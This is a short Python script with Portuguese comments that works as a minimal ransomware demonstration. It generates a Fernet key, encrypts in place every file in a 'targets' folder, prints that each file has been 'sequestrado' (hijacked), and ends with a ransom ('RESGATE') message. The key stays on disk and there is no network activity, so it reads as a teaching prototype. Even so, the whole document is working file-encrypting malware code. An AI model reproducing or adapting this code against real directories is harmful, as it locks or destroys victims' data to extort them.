import os
from cryptography.fernet import Fernet

# 1. Gerar ou carregar a chave
def carregar_chave():
    if not os.path.exists("chave.key"):
        key = Fernet.generate_key()
        with open("chave.key", "wb") as key_file:
            key_file.write(key)
    return open("chave.key", "rb").read()

# 2. Criptografar arquivos
def criptografar(diretorio, cipher):
    for arquivo in os.listdir(diretorio):
        caminho = os.path.join(diretorio, arquivo)
        if os.path.isfile(caminho) and not arquivo.endswith(".key"):
            with open(caminho, "rb") as f:
                dados = f.read()
            conteudo_criptografado = cipher.encrypt(dados)
            with open(caminho, "wb") as f:
                f.write(conteudo_criptografado)
            print(f"Arquivo {arquivo} sequestrado!")

# Execução (Crie uma pasta chamada 'targets' com arquivos .txt dentro antes de rodar)
if __name__ == "__main__":
    key = carregar_chave()
    cipher = Fernet(key)
    target_dir = "targets"
    
    if os.path.exists(target_dir):
        criptografar(target_dir, cipher)
        print("\nRESGATE: Seus arquivos foram criptografados. Use a chave.key para recuperar.")
    else:
        print("Erro: Pasta 'targets' não encontrada.")
